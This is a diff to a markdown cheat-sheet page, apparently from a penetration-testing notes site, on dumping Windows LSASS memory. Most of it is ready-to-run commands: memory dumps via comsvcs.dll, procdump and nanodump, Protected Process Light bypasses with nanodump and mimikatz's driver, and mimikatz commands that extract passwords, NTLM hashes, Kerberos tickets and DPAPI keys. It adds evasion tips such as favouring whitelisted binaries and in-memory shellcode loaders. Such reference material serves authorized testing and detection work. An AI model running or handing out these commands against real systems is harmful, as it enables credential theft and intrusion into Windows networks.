@@ -4,45 +4,39 @@ title: "LSASS"
 
 # 🔓 LSASS
 
-- Cache credentials locally in memory
-- Create access tokens
-- Enforce security policies
-- Write to Windows' security log
+> _Local Security Authority Subsystem Service. Caches logon credentials (NTLM, Kerberos keys, sometimes plaintext passwords) in memory - the richest credential source on a running Windows host._
 
-## Tools
+## 🛠️ Tools
 
 - [mimikatz (release)](https://github.com/gentilkiwi/mimikatz/releases)
 - [nanodump.x64.exe](https://github.com/fortra/nanodump/blob/main/dist/nanodump.x64.exe)
 
 ### Dump methods
 
-**GUI** : Task Manager > lsass.exe > Create dump file
+> From the GUI: Task Manager > `lsass.exe` right-click > Create dump file.
 
 ::: code-group
 
 ```cmd [cmd]
-tasklist /svc # get PID
-rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\lsass.dmp full
+tasklist /fi "imagename eq lsass.exe"                             # get PID
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\Windows\Temp\lsass.dmp full
 ```
 
 ```powershell [PowerShell]
-Get-Process lsass # get PID
-rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\lsass.dmp full
+(Get-Process lsass).Id                                            # get PID
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\Windows\Temp\lsass.dmp full
 ```
 
 ```cmd [procdump]
-procdump.exe -accepteula -ma lsass.exe lsass.dmp
+procdump.exe -accepteula -ma lsass.exe lsass.dmp                  # signed Sysinternals binary, often whitelisted
 ```
 
 ```bash [nanodump]
-# Generate shellcode
-donut -f nanodump.x64.exe -o payload.bin -a 2
+# Basic dump (invalid signature by default, use --valid for parsing)
+nanodump.x64.exe --write C:\Windows\Temp\lsass.dmp --valid
 
-# Basic dump
-nanodump.x64.exe --write C:\temp\lsass.dmp
-
-# PPL bypass (requires signed driver)
-nanodump.x64.exe --ppl --write lsass.dmp
+# Built-in PPL bypass (no signed driver needed)
+nanodump.x64.exe --ppl --write C:\Windows\Temp\lsass.dmp
 ```
 
 :::
@@ -78,14 +72,12 @@ pypykatz lsa minidump lsass.dmp | grep -i "ntlm" # NTLM only
 ```
 
 ```bash [mimikatz]
-sekurlsa::minidump C:\lsass.dmp # select lsass.dmp
-sekurlsa::logonPasswords        # extract password
-
-sekurlsa::tickets      # Kerberos tickets
-sekurlsa::msv          # LM/NTLM hashes only
-sekurlsa::ekeys        # Kerberos keys AES/RC4
-sekurlsa:dpapi         # Master keys DPAPI of connected users
-dpapi::masterkey       # DPAPI master keys
+sekurlsa::minidump C:\lsass.dmp         # load the dump
+sekurlsa::logonPasswords                # passwords + NTLM + Kerberos keys
+sekurlsa::tickets /export               # Kerberos tickets -> .kirbi files
+sekurlsa::msv                           # LM/NTLM hashes only
+sekurlsa::ekeys                         # Kerberos AES/RC4 keys
+sekurlsa::dpapi                         # cached DPAPI masterkeys of logged-on users
 ```
 
 :::
@@ -93,8 +85,10 @@ dpapi::masterkey       # DPAPI master keys
 ### PPL bypass (Windows 10/11)
 
 ```bash
-mimikatz # !+
+mimikatz # !+                                          # load mimidrv.sys - loud (DSE + EDR will flag)
 mimikatz # !processprotect /process:lsass.exe /remove
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonPasswords
 ```
+
+> _Prefer nanodump's built-in `--ppl` or an in-memory shellcode loader for live engagements._
